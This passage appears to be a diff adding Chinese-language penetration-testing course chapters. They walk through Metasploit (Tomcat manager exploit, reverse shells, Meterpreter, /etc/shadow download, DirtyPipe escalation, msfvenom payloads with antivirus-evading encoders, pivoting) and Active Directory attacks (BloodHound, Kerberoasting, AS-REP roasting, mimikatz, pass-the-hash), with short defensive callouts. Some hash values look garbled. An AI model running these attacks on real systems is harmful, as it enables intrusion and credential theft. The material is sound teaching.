劫持、Capabilities 滥用、凭证搜索</li>\n<li><strong>Windows 提权</strong>：未引用服务路径、PrintSpoofer、mimikatz 凭证提取</li>\n<li><strong>方法论</strong>：信息收集 → 枚举弱点 → 寻找凭证 → 利用提权</li>\n<li><strong>防御措施</strong>：最小权限原则、及时补丁、严格配置审计</li>\n</ol>\n\n<p>现在你已经能拿到 root/SYSTEM 权限了。但在真实环境中，单台机器的控制远远不够。下一节，我们将学习如何使用 Metasploit 框架来系统化地管理整个渗透测试流程。</p>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>";
+
+SECTION_CONTENT["pentest-03-01"] = "<h1>Metasploit 核心工作流：渗透测试的瑞士军刀</h1>\n\n<p>在前面的章节中，我们用各种零散的工具完成了侦察、漏洞利用和提权。但你有没有觉得——工具太多了，每个工具的用法不同，输出格式不同，管理起来非常混乱？</p>\n\n<p><strong>Metasploit Framework</strong> 就是为了解决这个问题而生的。它是渗透测试领域最强大的统一平台，将漏洞利用、Payload 生成、后渗透操作全部整合到一个框架中。</p>\n\n<div class=\"callout info\">\n<div class=\"callout-title\">Metasploit 发展史</div>\n<p>Metasploit 最初由 HD Moore 在 2003 年用 Perl 编写，后来被 Rapid7 收购并改用 Ruby 重写。如今它拥有超过 2300 个漏洞利用模块和 600 个 Payload，是全球渗透测试人员使用最广泛的工具。</p>\n</div>\n\n<h2>Metasploit 架构</h2>\n\n<p>在开始使用之前，理解 Metasploit 的模块化架构非常重要：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">Metasploit Framework 架构\n\n┌─────────────────────────────────────────────┐\n│              msfconsole (交互界面)            │\n├─────────────────────────────────────────────┤\n│  Modules          │  Payloads               │\n│  ├── Exploits     │  ├── Singles (独立)      │\n│  ├── Auxiliary    │  ├── Stagers (传输)      │\n│  ├── Post        │  └── Stages (功能)       │\n│  ├── Encoders     │                         │\n│  ├── Evasion      │  Sessions               │\n│  └── Nops         │  ├── Meterpreter        │\n│                   │  ├── Shell               │\n│  Libraries        │  └── Powershell          │\n│  ├── Rex          │                         │\n│  ├── Core         │  Database               │\n│  └── Mixins       │  └── PostgreSQL          │\n└─────────────────────────────────────────────┘</code></pre></div>\n\n<h3>核心概念解释</h3>\n\n<ul>\n<li><strong>Exploit（漏洞利用模块）</strong>：针对特定漏洞的攻击代码</li>\n<li><strong>Payload（载荷）</strong>：漏洞利用成功后在目标上执行的代码</li>\n<li><strong>Auxiliary（辅助模块）</strong>：扫描、嗅探、模糊测试等辅助功能</li>\n<li><strong>Post（后渗透模块）</strong>：获取 shell 之后的后续操作</li>\n<li><strong>Meterpreter</strong>：Metasploit 的高级 Payload，运行在内存中，功能强大且难以检测</li>\n<li><strong>Encoder（编码器）</strong>：对 Payload 进行编码以规避杀毒软件</li>\n</ul>\n\n<h2>启动与基础操作</h2>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 启动 Metasploit（确保 PostgreSQL 已运行）\n$ msfconsole -q\n\nmsf6 > version\nFramework: 6.3.35-dev\nConsole  : 6.3.35-dev\n\n# 首先初始化数据库（如果还没做的话）\nmsf6 > db_status\n[*] Connected to msf. Connection type: postgresql.\n\n# 查看可用模块数量\nmsf6 > show exploits\nExploits\n========\n   #  Name                                          Disclosure Date  Rank     Check  Description\n   -  ----                                          ---------------  ----     -----  -----------\n   0  exploit/windows/smb/ms17_010_eternalblue      2017-03-14       great    Yes    MS17-010 EternalBlue\n   1  exploit/multi/http/tomcat_mgr_deploy          2009-11-09       excellent Yes    Tomcat Manager Deploy\n   2  exploit/linux/http/apache_normalize_path      2021-10-05       normal   Yes    Apache Path Normalization\n   ...\n   2347 rows\n\nmsf6 > show auxiliary\n... (hundreds of auxiliary modules)</code></pre></div>\n\n<h2>工作空间与项目管理</h2>\n\n<p>在真实的渗透测试中，你可能同时测试多个目标。Metasploit 的工作空间功能帮你管理不同的项目：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 创建新的工作空间\nmsf6 > workspace -a targetcorp-pentest\n[*] Added workspace: targetcorp-pentest\nmsf6 > workspace targetcorp-pentest\n[*] Workspace: targetcorp-pentest\n\n# 将 nmap 扫描结果导入数据库\nmsf6 > db_import /home/pentester/full_scan.txt\n[*] Importing 'Nmap XML' data\n[*] Import: Parsing with 'Nokogiri v1.15.0'\n[*] Importing host 203.0.113.50\n[*] Importing host 203.0.113.51\n[*] Successfully imported /home/pentester/full_scan.txt\n\n# 查看导入的主机\nmsf6 > hosts\n\nHosts\n=====\naddress        mac  name              os_name  os_flavor  os_sp  purpose  info\n-------        ---  ----              -------  ---------  -----  -------  ----\n203.0.113.50        www.targetcorp    Linux               5.15   server   Apache 2.4.52\n203.0.113.51        app.targetcorp    Linux                      server   Tomcat 9.0.73\n\n# 查看发现的服务\nmsf6 > services\n\nServices\n========\nhost          port  proto  name   state  info\n----          ----  -----  ----   -----  ----\n203.0.113.50  22    tcp    ssh    open   OpenSSH 8.9p1\n203.0.113.50  80    tcp    http   open   Apache 2.4.52\n203.0.113.50  443   tcp    https  open   Apache 2.4.52\n203.0.113.50  3306  tcp    mysql  open   MySQL 8.0.33\n203.0.113.51  8080  tcp    http   open   Tomcat 9.0.73</code></pre></div>\n\n<h2>实战场景：利用 Tomcat Manager 获取初始访问</h2>\n\n<p>还记得我们在侦察阶段发现的 Tomcat 9.0.73 吗？它在 8080 端口运行，并且启用了 PUT 方法。现在让我们用 Metasploit 来利用它：</p>\n\n<h3>第一步：搜索并选择漏洞利用模块</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 搜索 Tomcat 相关的利用模块\nmsf6 > search tomcat\n\nMatching Modules\n================\n   #  Name                                          Disclosure Date  Rank      Description\n   -  ----                                          ---------------  ----      -----------\n   0  exploit/multi/http/tomcat_mgr_deploy          2009-11-09       excellent Apache Tomcat Manager Deploy\n   1  exploit/multi/http/tomcat_mgr_upload          2009-11-09       excellent Apache Tomcat Manager Upload\n   2  auxiliary/scanner/http/tomcat_mgr_login                        normal    Tomcat Manager Login Checker\n   3  auxiliary/admin/http/tomcat_admin_gui                         normal    Tomcat Admin GUI Access\n\n# 选择模块\nmsf6 > use exploit/multi/http/tomcat_mgr_deploy\n[*] Using configured payload java/jsp_shell_reverse_tcp\n\n# 查看模块需要的参数\nmsf6 exploit(tomcat_mgr_deploy) > show options\n\nModule options (exploit/multi/http/tomcat_mgr_deploy):\n\n   Name          Current Setting  Required  Description\n   ----          ---------------  --------  -----------\n   HttpPassword                   yes       The password for the Tomcat manager\n   HttpUsername                   yes       The username for the Tomcat manager\n   Proxies                        no        HTTP proxy\n   RHOSTS                         yes       The target host(s)\n   RPORT         8080             yes       The target port\n   TARGETURI     /manager         yes       The URI path of the manager app\n\nPayload options (java/jsp_shell_reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST                   yes       The listen address\n   LPORT  4444             yes       The listen port</code></pre></div>\n\n<h3>第二步：配置参数并攻击</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 设置目标参数\nmsf6 exploit(tomcat_mgr_deploy) > set RHOSTS 203.0.113.51\nRHOSTS => 203.0.113.51\n\nmsf6 exploit(tomcat_mgr_deploy) > set HttpUsername tomcat\nHttpUsername => tomcat\n\nmsf6 exploit(tomcat_mgr_deploy) > set HttpPassword tomcat123\nHttpPassword => tomcat123\n\nmsf6 exploit(tomcat_mgr_deploy) > set LHOST 10.10.14.5\nLHOST => 10.10.14.5\n\nmsf6 exploit(tomcat_mgr_deploy) > set LPORT 4444\nLPORT => 4444\n\n# 检查目标是否可利用\nmsf6 exploit(tomcat_mgr_deploy) > check\n[+] 203.0.113.51:8080 - The target is vulnerable. Tomcat Manager is accessible.\n\n# 发起攻击！\nmsf6 exploit(tomcat_mgr_deploy) > exploit\n\n[*] Started reverse TCP handler on 10.10.14.5:4444\n[*] Attempting to automatically select a target...\n[*] Attempting to automatically detect the platform...\n[*] Uploading 6095 bytes as Zm9vYmFy.war ...\n[*] Executing /Zm9vYmFy/Zm9vYmFy.jsp...\n[*] Sending stage (51 bytes) to 203.0.113.51\n[*] Command shell session 1 opened (10.10.14.5:4444 -> 203.0.113.51:45678)\n\n# 我们拿到了一个 shell！\nid\nuid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)\nwhoami\ntomcat</code></pre></div>\n\n<h3>第三步：升级到 Meterpreter</h3>\n\n<p>基础的命令行 shell 功能有限。让我们把它升级到 Meterpreter——Metasploit 的高级后渗透 Payload：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 将 shell 放到后台\n^Z\nBackground session 1? [y/N]  y\n\n# 搜索 session 升级模块\nmsf6 > search shell_to_meterpreter\n\nMatching Modules\n================\n   #  Name                                      Rank    Description\n   -  ----                                      ----    -----------\n   0  post/multi/manage/shell_to_meterpreter    normal  Shell to Meterpreter\n\nmsf6 > use post/multi/manage/shell_to_meterpreter\nmsf6 post(shell_to_meterpreter) > set SESSION 1\nSESSION => 1\nmsf6 post(shell_to_meterpreter) > set LHOST 10.10.14.5\nLHOST => 10.10.14.5\nmsf6 post(shell_to_meterpreter) > exploit\n\n[*] Upgrading session ID: 1\n[*] Starting exploit/multi/handler\n[*] Started reverse TCP handler on 10.10.14.5:4433\n[*] Sending stage (957487 bytes) to 203.0.113.51\n[*] Meterpreter session 2 opened (10.10.14.5:4433 -> 203.0.113.51:45680)\n\n# 现在使用 Meterpreter！\nmsf6 > sessions -i 2\n\nmeterpreter > sysinfo\nComputer     : app-server-01\nOS           : Ubuntu 22.04 (Linux 5.15.0-76)\nArchitecture : x64\nMeterpreter  : java/linux\n\n# Meterpreter 核心命令\nmeterpreter > getuid\nServer username: tomcat\n\nmeterpreter > getwd\n/opt/tomcat\n\nmeterpreter > ls\nListing: /opt/tomcat\n====================\ndrwxr-x---  tomcat  tomcat  4096  conf/\ndrwxr-x---  tomcat  tomcat  4096  logs/\ndrwxr-x---  tomcat  tomcat  4096  webapps/\ndrwxr-x---  tomcat  tomcat  4096  temp/\n-rwxr-x---  tomcat  tomcat  1234  tomcat-users.xml\n\n# 查看 tomcat 用户配置——可能包含明文密码！\nmeterpreter > cat conf/tomcat-users.xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<tomcat-users>\n  <role rolename=\"manager-gui\"/>\n  <role rolename=\"admin-gui\"/>\n  <user username=\"tomcat\" password=\"tomcat123\" roles=\"manager-gui,admin-gui\"/>\n  <user username=\"admin\" password=\"T0mc@t#Adm!n\" roles=\"manager-script\"/>\n</tomcat-users></code></pre></div>\n\n<h2>Meterpreter 核心功能</h2>\n\n<p>Meterpreter 是 Metasploit 最强大的组件。它运行在目标内存中，不落地磁盘，功能丰富：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 文件系统操作\nmeterpreter > search -f \"*.conf\" /etc/\nFound 23 results...\n    /etc/apache2/apache2.conf (14523 bytes)\n    /etc/mysql/mysql.conf.d/mysqld.cnf (3421 bytes)\n    /etc/ssh/sshd_config (3241 bytes)\n\nmeterpreter > download /etc/shadow /tmp/pentest/\n[*] Downloading: /etc/shadow -> /tmp/pentest/shadow\n[*] Downloaded 1.50 KiB of 1.50 KiB (100.0%): /etc/shadow\n[*] download   : /etc/shadow -> /tmp/pentest/shadow\n\n# 进程操作\nmeterpreter > ps\n\nProcess List\n============\n PID   PPID  Name              Arch    User     Path\n ---   ----  ----              ----    ----     ----\n 1     0     systemd           x64     root     /lib/systemd/systemd\n 847   1     sshd              x64     root     /usr/sbin/sshd\n 1024  1     mysqld            x64     mysql    /usr/sbin/mysqld\n 1234  1     java              x64     tomcat   /opt/tomcat/bin/java\n 2345  847   sshd              x64     alice    /usr/sbin/sshd\n 2567  2345  bash              x64     alice    /bin/bash\n\n# 尝试迁移到更稳定的进程\nmeterpreter > migrate 1234\n[*] Migrating from 3456 to 1234...\n[*] Migration completed successfully.\n\n# 网络信息\nmeterpreter > ifconfig\nInterface  2\nName       : eth0\nMAC        : 00:16:3e:5f:48:a2\nIPv4       : 203.0.113.51\nNetmask    : 255.255.255.0\n\nmeterpreter > netstat\nTCP active connections\n======================\nLocal address    Port   Remote address   Port   State\n203.0.113.51     8080   0.0.0.0          0      LISTEN\n203.0.113.51     3306   0.0.0.0          0      LISTEN\n203.0.113.51     45678  10.10.14.5       4433   ESTABLISHED</code></pre></div>\n\n<h2>后渗透模块（Post Modules）</h2>\n\n<p>Metasploit 的后渗透模块可以在获取 shell 后自动执行各种操作：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 运行系统信息收集\nmsf6 > use post/linux/gather/enum_system\nmsf6 post(enum_system) > set SESSION 2\nmsf6 post(enum_system) > run\n\n[*] Running module against app-server-01 (203.0.113.51)\n[+] Info:\n[+]   Ubuntu 22.04.2 LTS\n[+]   Linux app-server-01 5.15.0-76-generic\n[+] Saved information to /root/.msf4/loot/...\n[*] Checking for common services...\n[+] MySQL 8.0.33 running as mysql\n[+] Apache 2.4.52 running as www-data\n[+] SSH running (OpenSSH 8.9p1)\n\n# 搜索提权路径\nmsf6 > use post/multi/recon/local_exploit_suggester\nmsf6 post(local_exploit_suggester) > set SESSION 2\nmsf6 post(local_exploit_suggester) > run\n\n[*] 203.0.113.51 - Collecting local exploit information\n[+] linux/local/cve_2022_0847_dirtypipe.rb:\n    The target appears to be vulnerable.\n[+] linux/local/sudo_baron_samedit.rb:\n    The target service is running, but has not been validated.\n[*] 203.0.113.51 - Checking for DirtyPipe (CVE-2022-0847)...\n[+] The target is vulnerable to DirtyPipe!\n\n# 自动提权\nmsf6 > use exploit/linux/local/cve_2022_0847_dirtypipe\nmsf6 exploit(cve_2022_0847_dirtypipe) > set SESSION 2\nmsf6 exploit(cve_2022_0847_dirtypipe) > set LPORT 5555\nmsf6 exploit(cve_2022_0847_dirtypipe) > exploit\n\n[*] Started reverse TCP handler on 10.10.14.5:5555\n[*] Running check...\n[+] The target is vulnerable.\n[*] Launching exploit...\n[*] Sending stage (3045388 bytes)\n[*] Meterpreter session 3 opened (10.10.14.5:5555 -> 203.0.113.51:48901)\n\nmeterpreter > getuid\nServer username: root</code></pre></div>\n\n<h2>Payload 生成与规避</h2>\n\n<p>有时候 Metasploit 的现成模块不够用，你需要手动生成 Payload：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 使用 msfvenom 生成各种格式的 Payload\n# Windows 反向 TCP Meterpreter\n$ msfvenom -p windows/x64/meterpreter/reverse_tcp \\\n  LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe\n\n# 使用编码器规避基础杀毒\n$ msfvenom -p windows/x64/meterpreter/reverse_tcp \\\n  LHOST=10.10.14.5 LPORT=4444 \\\n  -e x64/xor_dynamic -i 5 \\\n  -f exe -o encoded_shell.exe\n\n# 生成 Web Shell (PHP)\n$ msfvenom -p php/meterpreter/reverse_tcp \\\n  LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php\n\n# 生成 PowerShell Payload (Windows)\n$ msfvenom -p windows/x64/meterpreter/reverse_tcp \\\n  LHOST=10.10.14.5 LPORT=4444 \\\n  -f psh-reflection -o shell.ps1\n\n# 生成 macOS Payload\n$ msfvenom -p osx/x64/meterpreter/reverse_tcp \\\n  LHOST=10.10.14.5 LPORT=4444 -f macho -o shell.macho</code></pre></div>\n\n<div class=\"callout warn\">\n<div class=\"callout-title\">关于杀软规避</div>\n<p>基础的编码（encoder）在现代杀毒软件面前效果有限。在真实渗透测试中，你可能需要：</p>\n<ul>\n<li><strong>Veil-Evasion</strong>：生成免杀 Payload 的框架</li>\n<li><strong>Donut</strong>：将 .NET 程序集转换为 shellcode</li>\n<li><strong>自定义加密器</strong>：用 AES/XOR 加密 Payload，运行时解密</li>\n<li><strong>进程注入</strong>：将 Payload 注入到合法进程中</li>\n</ul>\n</div>\n\n<h2>Metasploit 的高级用法</h2>\n\n<h3>路由与 Pivoting</h3>\n\n<p>当你控制了一台机器，可以通过它访问内部网络中的其他机器——这就是 Pivoting（枢纽）：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 在 Meterpreter session 中设置路由\nmeterpreter > run post/multi/manage/autoroute\n\n[*] Running module against app-server-01\n[*] Subnet: 192.168.1.0/24\n[*] Adding route to 192.168.1.0/255.255.255.0 through session 3\n[*] Use the following command to clean up routes:\n[*]   run post/multi/manage/autoroute CMD=delete\n\n# 验证路由\nmsf6 > route print\n\nActive Routing Table\n====================\nSubnet           Netmask          Gateway\n------           -------          -------\n192.168.1.0      255.255.255.0    Session 3\n\n# 现在可以通过 pivot 扫描内网\nmsf6 > use auxiliary/scanner/portscan/tcp\nmsf6 auxiliary(tcp) > set RHOSTS 192.168.1.0/24\nmsf6 auxiliary(tcp) > set PORTS 22,80,445,3389\nmsf6 auxiliary(tcp) > run\n\n[*] 192.168.1.10:22 - TCP OPEN\n[*] 192.168.1.10:445 - TCP OPEN\n[*] 192.168.1.20:80 - TCP OPEN\n[*] 192.168.1.20:445 - TCP OPEN\n[*] 192.168.1.100:3389 - TCP OPEN\n\n# 发现了内网的 DC (192.168.1.10) 和其他服务器！</code></pre></div>\n\n<h3>资源脚本（Resource Scripts）</h3>\n\n<p>重复性的操作可以写成资源脚本，实现一键执行：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 创建一个自动化的攻击脚本 auto_attack.rc\n$ cat > auto_attack.rc << 'EOF'\n# 设置工作空间\nworkspace -a auto-pentest\nworkspace auto-pentest\n\n# 导入之前的扫描结果\ndb_import /home/pentester/full_scan.txt\n\n# 扫描 Tomcat Manager\nuse auxiliary/scanner/http/tomcat_mgr_login\nset RHOSTS 203.0.113.51\nset USERPASS_FILE /usr/share/wordlists/tomcat_mgr_default.txt\nset VERBOSE false\nrun\n\n# 如果找到了凭证，利用 Tomcat 部署\nuse exploit/multi/http/tomcat_mgr_deploy\nset RHOSTS 203.0.113.51\nset HttpUsername tomcat\nset HttpPassword tomcat123\nset LHOST 10.10.14.5\nset LPORT 4444\nexploit\nEOF\n\n# 执行资源脚本\n$ msfconsole -r auto_attack.rc</code></pre></div>\n\n<div class=\"callout success\">\n<div class=\"callout-title\">防御视角：对抗 Metasploit</div>\n<p>防御者可以采取以下措施对抗 Metasploit 攻击：</p>\n<ul>\n<li><strong>网络分段</strong>：限制横向移动的可能，减少 Pivot 的价值</li>\n<li><strong>EDR（端点检测响应）</strong>：检测 Meterpreter 的内存注入行为</li>\n<li><strong>网络监控</strong>：检测 Meterpreter 的反向连接特征</li>\n<li><strong>应用程序白名单</strong>：阻止未授权的可执行文件运行</li>\n<li><strong>及时补丁</strong>：Metasploit 依赖已知漏洞，补丁是最好的防御</li>\n<li><strong>蜜罐</strong>：部署蜜罐诱捕使用 Metasploit 扫描的攻击者</li>\n</ul>\n</div>\n\n<div class=\"checkpoint\" data-cp=\"0\"></div>\n\n<h2>本节小结</h2>\n\n<p>Metasploit 是渗透测试的核心框架。我们学习了：</p>\n\n<ol>\n<li><strong>架构</strong>：Exploit、Payload、Auxiliary、Post 模块的组织方式</li>\n<li><strong>工作流</strong>：从搜索模块到配置参数到发起攻击的完整流程</li>\n<li><strong>Meterpreter</strong>：内存驻留的高级 Payload，提供文件操作、进程管理、网络探测等功能</li>\n<li><strong>Pivoting</strong>：通过已控制的机器访问内部网络</li>\n<li><strong>自动化</strong>：资源脚本实现一键攻击流程</li>\n</ol>\n\n<p>下一节，我们将深入企业渗透测试的核心——Active Directory 攻击链。在真实的企业环境中，AD 域控制器是最终的\"皇冠上的宝石\"。</p>\n\n<div class=\"checkpoint\" data-cp=\"1\"></div>";
+
+SECTION_CONTENT["pentest-04-01"] = "<h1>Active Directory 攻击链：攻破企业的心脏</h1>\n\n<p>如果你只学一个企业渗透测试技能，那一定要学 Active Directory。</p>\n\n<p>在全球 Fortune 500 强企业中，超过 90% 使用 Active Directory 作为身份认证和权限管理的基础设施。AD 域控制器（Domain Controller）控制着整个网络中\"谁是谁\"和\"谁能做什么\"。<strong>控制了 AD 域控，你就控制了整个企业。</strong></p>\n\n<div class=\"callout info\">\n<div class=\"callout-title\">什么是 Active Directory？</div>\n<p>Active Directory 是微软开发的目录服务，用于管理网络中的用户、计算机、组和策略。核心组件包括：</p>\n<ul>\n<li><strong>域控制器（DC）</strong>：运行 AD DS 服务的服务器，存储目录数据库</li>\n<li><strong>Kerberos</strong>：默认的认证协议</li>\n<li><strong>LDAP</strong>：目录查询协议</li>\n<li><strong>组策略（GPO）</strong>：集中管理安全策略</li>\n<li><strong>信任关系</strong>：域之间的信任链接</li>\n</ul>\n</div>\n\n<h2>AD 攻击前的准备</h2>\n\n<p>假设你已经通过前面的步骤获得了一个域内机器的 Meterpreter session，并且提升到了本地管理员权限。现在是时候开始域渗透了。</p>\n\n<h3>域信息枚举</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 在 Meterpreter 中加载 PowerShell\nmeterpreter > load powershell\nLoading extension powershell...Success.\n\n# 获取域基本信息\nmeterpreter > powershell_execute \"Get-ADDomain | Select-Object Name,Forest,DomainControllers,NetBIOSName\"\n\nName              : TARGETCORP\nForest            : targetcorp.local\nDomainControllers : {DC01.targetcorp.local}\nNetBIOSName       : TARGETCORP\n\n# 列出域控制器\nmeterpreter > powershell_execute \"Get-ADDomainController | Select-Object Name,IPv4Address,OSVersion,Site\"\n\nName   IPv4Address    OSVersion          Site\n----   -----------    ---------          ----\nDC01   192.168.1.10   Windows Server 2019  Default-First-Site\n\n# 列出所有域用户\nmeterpreter > powershell_execute \"Get-ADUser -Filter * -Properties * | Select-Object SamAccountName,Title,Department,MemberOf | Format-Table -AutoSize\"\n\nSamAccountName  Title             Department     MemberOf\n--------------  -----             ----------     --------\nAdministrator   Domain Admin      IT             {Domain Admins,...}\nsvc_backup      Backup Service    IT             {Backup Operators,...}\njdoe            Developer         Engineering    {Developers,...}\nasmith          Sysadmin          IT             {IT Admins,...}\nmwilson         Manager           Sales          {Sales Team,...}\nkrbtgt          Key Distribution   IT             {Domain Users}</code></pre></div>\n\n<h3>BloodHound：绘制攻击路径</h3>\n\n<p>BloodHound 是 AD 渗透测试的核武器级工具。它使用图论来分析域内的权限关系，自动找出从当前用户到域管理员的最短攻击路径：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 在目标机器上运行 SharpHound 数据采集器\nmeterpreter > upload /opt/BloodHound/Collectors/SharpHound.exe\nmeterpreter > execute -f \"SharpHound.exe\" -a \"--CollectionMethods All --Domain targetcorp.local\"\n[*] SharpHound collection started\n[*] Enumerating objects in targetcorp.local\n[+] Found 156 users\n[+] Found 42 computers\n[+] Found 38 groups\n[+] Found 12 GPOs\n[+] Found 3 OUs\n[+] Found 2 domains\n[+] Session enumeration: 8 active sessions\n[+] Local admin rights: 15 relationships\n[+] Finished collection in 00:00:12.345\n[+] Output: 20240720_bloodhound.zip\n\n# 下载数据\nmeterpreter > download 20240720_bloodhound.zip\n[*] Downloaded 45.20 KiB\n\n# 在攻击机上启动 BloodHound 并导入数据\n$ neo4j start\n$ bloodhound &\n# 在 BloodHound GUI 中导入 zip 文件</code></pre></div>\n\n<p>BloodHound 导入数据后，你可以在 GUI 中查询：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">BloodHound 攻击路径分析结果\n\n查询: \"Shortest Path to Domain Admins\"\n\n发现路径:\n  web_svc@TARGETCORP\n    → [AdminTo] → APP-SERVER-01\n      → [HasSession] → asmith (IT Admin)\n        → [MemberOf] → IT Admins Group\n          → [GenericAll] → svc_backup\n            → [MemberOf] → Backup Operators\n              → [AdminTo] → DC01.targetcorp.local\n                → [MemberOf] → Domain Admins\n\n攻击计划:\n1. 从 APP-SERVER-01 获取 asmith 的会话令牌\n2. 利用 asmith 对 svc_backup 的 GenericAll 权限\n3. 通过 Backup Operators 组成员身份访问 DC01\n4. 从 DC01 获取 Domain Admin 权限</code></pre></div>\n\n<div class=\"callout warn\">\n<div class=\"callout-title\">BloodHound 的价值</div>\n<p>没有 BloodHound，你可能需要手动分析数百个 ACL 和组成员关系才能找到这条路径。BloodHound 在几秒钟内就帮你画出了攻击路线图。这也是为什么 BloodHound 几乎出现在每一场真实的域渗透测试中。</p>\n</div>\n\n<h2>Kerberos 协议攻击</h2>\n\n<p>Kerberos 是 AD 的核心认证协议。理解 Kerberos 的工作原理是理解 AD 攻击的基础。</p>\n\n<h3>Kerberos 认证流程简述</h3>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">Kerberos 认证三步曲:\n\n1. AS-REQ / AS-REP（认证服务交换）\n   用户 → KDC: \"我是 jdoe，请给我 TGT\"\n   KDC → 用户: \"这是你的 TGT（用 krbtgt 密钥加密）\"\n\n2. TGS-REQ / TGS-REP（票据授予交换）\n   用户 → KDC: \"这是我的 TGT，我要访问 file-server\"\n   KDC → 用户: \"这是 Service Ticket（用目标服务密钥加密）\"\n\n3. AP-REQ / AP-REP（应用请求交换）\n   用户 → 服务: \"这是我的 Service Ticket\"\n   服务: \"验证通过，允许访问\"</code></pre></div>\n\n<h3>Kerberoasting：攻击服务账户</h3>\n\n<p>Kerberoasting 是 AD 渗透中最常用的攻击之一。它利用 TGS 票据可以被离线破解的特性来攻击服务账户：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 使用 Impacket 的 GetUserSPNs 请求所有 SPN 的票据\n$ impacket-GetUserSPNs -dc-ip 192.168.1.10 targetcorp.local/jdoe:Password123 -request\n\nImpacket v0.11.0 - Copyright 2023 Fortra\n\nServicePrincipalName                    Name          MemberOf\n---------------------------------------- ------------- --------\nMSSQLSvc/db-server:1433                 svc_sql       {Service Accounts}\nHTTP/intranet.targetcorp.local          svc_web       {Service Accounts}\nCIFS/file-server.targetcorp.local       svc_file      {Service Accounts, Backup Operators}\nHOST/backup-server.targetcorp.local     svc_backup    {Backup Operators}\n\n$krb5tgs$23$*svc_sql*TARGETCORP.LOCAL*targetcorp.local/svc_sql*$a3f5b2...\n$krb5tgs$23$*svc_web*TARGETCORP.LOCAL*targetcorp.local/svc_web*$7c8d1e...\n$krb5tgs$23$*svc_file*TARGETCORP.LOCAL*targetcorp.local/svc_file*$9e2f4a...\n$krb5tgs$23$*svc_backup*TARGETCORP.LOCAL*targetcorp.local/svc_backup*$b1c3d5...\n\n# 保存票据并用 hashcat 离线破解\n$ cat > kerberos_hashes.txt << 'EOF'\n$krb5tgs$23$*svc_sql*TARGETCORP.LOCAL*targetcorp.local/svc_sql*$a3f5b2...\n$krb5tgs$23$*svc_web*TARGETCORP.LOCAL*targetcorp.local/svc_web*$7c8d1e...\nEOF\n\n$ hashcat -m 13100 kerberos_hashes.txt /usr/share/wordlists/rockyou.txt --force\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)\n\n$krb5tgs$23$*svc_sql*...:SQLService2019!\n$krb5tgs$23$*svc_web*...:WebServer#Secure\n\n# 破解成功！svc_sql 的密码是 SQLService2019!\n# 现在我们有了数据库服务账户的凭证</code></pre></div>\n\n<h3>AS-REP Roasting</h3>\n\n<p>如果某些用户没有启用\"需要 Kerberos 预认证\"（Pre-Auth），我们可以直接请求他们的 TGT 并进行离线破解：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 枚举没有 Pre-Auth 的用户\n$ impacket-GetNPUsers -dc-ip 192.168.1.10 targetcorp.local/ -usersfile users.txt -no-pass\n\nImpacket v0.11.0\n\n[*] Getting TGT for jdoe\n[*] Getting TGT for mwilson\n$krb5asrep$23$mwilson@TARGETCORP.LOCAL:4e8f2a...\n\n# 破解 AS-REP 票据\n$ hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt\n\n$krb5asrep$23$mwilson@TARGETCORP.LOCAL:4e8f2a...:Sales2024!\n\n# 破解成功！mwilson 的密码是 Sales2024!</code></pre></div>\n\n<h2>凭证攻击链</h2>\n\n<h3>Pass-the-Hash（哈希传递）</h3>\n\n<p>在 Windows 网络中，你不一定需要明文密码——NTLM 哈希本身就足够进行认证：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># 使用 mimikatz 导出本地 SAM 数据库中的哈希\nmimikatz # lsadump::sam\n\nDomain : APP-SERVER-01\nSysKey : a1b2c3d4e5f6...\n\nRID  : 000001f4 (500)\nUser : Administrator\n  Hash NTLM: fc525c9683e8fe067095ba2ddc971889\n\nRID  : 000003e8 (1000)\nUser : asmith\n  Hash NTLM: a]ad3b435b51404eeaad3b435b51404ee\n\n# 使用 Pass-the-Hash 以 asmith 身份访问其他机器\n$ impacket-psexec -hashes :aad3b435b51404eeaad3b435b51404ee \\\n  targetcorp.local/asmith@192.168.1.20\n\nImpacket v0.11.0\n[*] Requesting shares on 192.168.1.20.....\n[*] Found writable share ADMIN$\n[*] Opening SVCCTL on 192.168.1.20\n[*] Creating service QrNx on 192.168.1.20.....\n[*] Starting service QrNx.....\n\nC:\\Windows\\system32> whoami\ntargetcorp\\asmith\n\n# 成功！我们不需要知道 asmith 的明文密码\n# 只需要 NTLM 哈希就能获得远程 